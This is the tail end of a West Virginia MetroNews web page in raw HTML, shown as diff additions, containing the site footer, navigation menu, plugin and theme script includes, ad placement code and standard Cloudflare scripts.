+                            <a href="https://wvrcdigital.com/"><img src="https://wvmetronews.com/wp-content/uploads/2022/05/wvrc_digital_web.png" id="wvrc-logo" /></a>
+                            <br/><a href="http://citynet.net/"><img src="https://wvmetronews.com/wp-content/themes/wvmn/img/citynet.png" id="citynet-logo" /></a>
+                        </td>
+                    </tr>
+                    <tr><td valign="top"><i class="fas fa-map-marker-alt fa-fw"></i></td>
+                        <td valign="top"><a href="https://www.google.com/maps/place/1111+Virginia+St+E,+Charleston,+WV+25301/@38.3460378,-81.634737,17z/data=!3m1!4b1!4m5!3m4!1s0x884f2ccf19576129:0xcd9a7e8dc4b35695!8m2!3d38.3460336!4d-81.632543">1111 Virginia Street East<br/>Charleston, WV 25301</a></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="col-md-2">
+            </div>
+            <div class="col-md-4 text-right">
+                <div class="icon-links">
+<!--                    <a href="https://itunes.apple.com/us/app/dominion-post/id855069436?mt=8" target="_blank"><i class="fab fa-apple"></i></a>-->
+<!--                    <a href="https://play.google.com/store/apps/details?id=team.vc.thedominionpost&hl=en_US" target="_blank"><i class="fab fa-google-play"></i></a>-->
+                    <a href="https://www.youtube.com/channel/UCVNbnHykyt0j1jB5_TePm9g" target="_blank"><i class="fab fa-youtube-square"></i></a>
+                    <a href="https://www.facebook.com/WVMetroNews" target="_blank"><i class="fab fa-facebook"></i></a>
+                    <a href="https://twitter.com/WVMetroNews" target="_blank"><i class="fab fa-twitter-square"></i></a>
+                </div>
+                <p id="foot-nav"><a href="/contact-us">Contact Us</a> &nbsp;|&nbsp; <a href="/privacy-policy">Privacy Policy</a> &nbsp;|&nbsp; <a href="/employment">Employment</a> &nbsp;|&nbsp; <a href="http://intranet.wvradio.com/" target="_blank">Affiliates Intranet</a>
+                <br><a class="change-consent" onclick="if (!window.__cfRLUnblockHandlers) return false; window.__uspapi('displayUspUi');" data-cf-modified-d157fd38a32685cc840424ab-="">Do Not Sell My Personal Information</a>
+                 <br>Copyright &copy; 2026 West Virginia MetroNews Network.</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- FONT SIZE -->
+
+<link rel='stylesheet' id='climacons-css-css' href='https://wvmetronews.com/wp-content/plugins/owm-weather/css/climacons-font.min.css?ver=6.6.8' type='text/css' media='all' />
+<link rel='stylesheet' id='owmweather-anim-css-css' href='https://wvmetronews.com/wp-content/plugins/owm-weather/css/owmweather-anim.min.css?ver=6.6.8' type='text/css' media='all' />
+<script type="d157fd38a32685cc840424ab-text/javascript" id="owmw-ajax-js-js-before">
+/* <![CDATA[ */
+const owmwAjax = {"owmw_nonce":"85d55ebfe1","owmw_url":"https:\/\/wvmetronews.com\/wp-admin\/admin-ajax.php?lang=en"}
+/* ]]> */
+</script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/plugins/owm-weather/js/owm-weather-ajax.js?ver=6.6.8" id="owmw-ajax-js-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" id="ufc-frontend-script-js-extra">
+/* <![CDATA[ */
+var ufc_frontend_ajax_data = {"ajaxurl":"https:\/\/wvmetronews.com\/wp-admin\/admin-ajax.php","permalink":"https:\/\/wvmetronews.com\/2026\/05\/23\/boys-state-track-huntington-doddridge-defends-in-class-aa\/","title":"Boys State Track: Huntington & Morgantown share Class AAAA title; Doddridge defends in Class AA","postid":"671539","security":"eaa8270135","version":"1.4.8"};
+/* ]]> */
+</script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/plugins/ultimate-facebook-comments/public/js/frontend.min.js?ver=1.4.8" id="ufc-frontend-script-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/theme.min.js?ver=1.0.1780461722" id="understrap-scripts-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/slick.js?ver=1.0.1780461722" id="slick-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/stickyad.js?ver=1.0.1780461722" id="stickyad-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/wvmn.js?ver=1.0.1780461722" id="wvmn-dompost-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" id="partials-ajax-js-extra">
+/* <![CDATA[ */
+var partials_ajax = {"ajaxurl":"https:\/\/wvmetronews.com\/wp-admin\/admin-ajax.php","nonce":"a532e0ab35"};
+/* ]]> */
+</script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/partials-ajax.js?ver=1.0.1780461722" id="partials-ajax-js"></script>
+<script type="d157fd38a32685cc840424ab-text/javascript" id="scoreboardtick-ajax-js-extra">
+/* <![CDATA[ */
+var scoreboardtick_ajax = {"ajaxurl":"https:\/\/wvmetronews.com\/wp-admin\/admin-ajax.php","nonce":"d728016898"};
+/* ]]> */
+</script>
+<script type="d157fd38a32685cc840424ab-text/javascript" src="https://wvmetronews.com/wp-content/themes/wvmn/js/scoreboardtick-ajax.js?ver=30" id="scoreboardtick-ajax-js"></script>
+
+<div id="mobile-menu">
+    <ul id="menu-mobile-news-menu" class="mobile-list"><li id="menu-item-374541" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374541"><a href="/"><i class="fad fa-home-lg fa-fw"></i> WV MetroNews Home</a></li>
+<li id="menu-item-479208" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-479208"><a href="https://wvmetronews.com/news/"><i class="fad fa-newspaper fa-fw"></i> News</a></li>
+<li id="menu-item-587252" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-587252"><a href="https://wvmetronews.com/sports">Sports</a>
+<ul class="sub-menu">
+	<li id="menu-item-374547" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374547"><a href="https://wvmetronews.com/sports/wvu-sports/">WVU Sports</a></li>
+	<li id="menu-item-479482" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-479482"><a href="https://wvmetronews.com/sports/high-school-sports/">High School Sports</a></li>
+	<li id="menu-item-374546" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374546"><a href="https://wvmetronews.com/sports/marshall-sports/">Marshall Sports</a></li>
+</ul>
+</li>
+<li id="menu-item-501343" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-501343"><a href="https://wvmetronews.com/outdoors/?cache-buster=20230299"><i class="fad fa-trees fa-fw"></i> Outdoors</a></li>
+<li id="menu-item-374548" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374548"><a href="https://wvmetronews.com/podcast/"><i class="fad fa-volume fa-fw"></i> Podcasts</a></li>
+<li id="menu-item-558910" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-558910"><a href="https://www.wvmetronewstv.com/"><i class="fab fa-youtube fa-fw"></i> MetroNews Television</a></li>
+<li id="menu-item-374555" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-374555"><a href="https://wvmetronews.com/about-metronews/"><i class="fad fa-info-circle fa-fw"></i> About Us</a>
+<ul class="sub-menu">
+	<li id="menu-item-374556" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374556"><a href="https://wvmetronews.com/advertising/">Advertising</a></li>
+	<li id="menu-item-374557" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374557"><a href="https://wvmetronews.com/affiliates/">Affiliates</a></li>
+	<li id="menu-item-374559" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374559"><a href="https://wvmetronews.com/our-people/">Our People</a></li>
+	<li id="menu-item-374558" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374558"><a href="https://wvmetronews.com/contact-us/">Contact Us</a></li>
+</ul>
+</li>
+</ul></div>
+
+<div align="center" data-freestar-ad="__320x100 __970x90" id="wvmetronews_leaderboard_btf"> <script data-cfasync="false" type="text/javascript"> freestar.config.enabled_slots.push({placementName: "wvmetronews_leaderboard_btf", slotId: "wvmetronews_leaderboard_btf"}); </script></div>
+<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="d157fd38a32685cc840424ab-|49" defer></script><script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3ee64708b70620b',t:'MTc5MDA0OTUxOA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"511dd10b6bfc4f32968688819d413879","spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
+
+<!-- plugin=object-cache-pro client=phpredis metric#hits=3414 metric#misses=151 metric#hit-ratio=95.8 metric#bytes=4383370 metric#prefetches=227 metric#store-reads=112 metric#store-writes=13 metric#store-hits=238 metric#store-misses=144 metric#sql-queries=22 metric#ms-total=1159.50 metric#ms-cache=127.32 metric#ms-cache-avg=1.0268 metric#ms-cache-ratio=11.0 -->
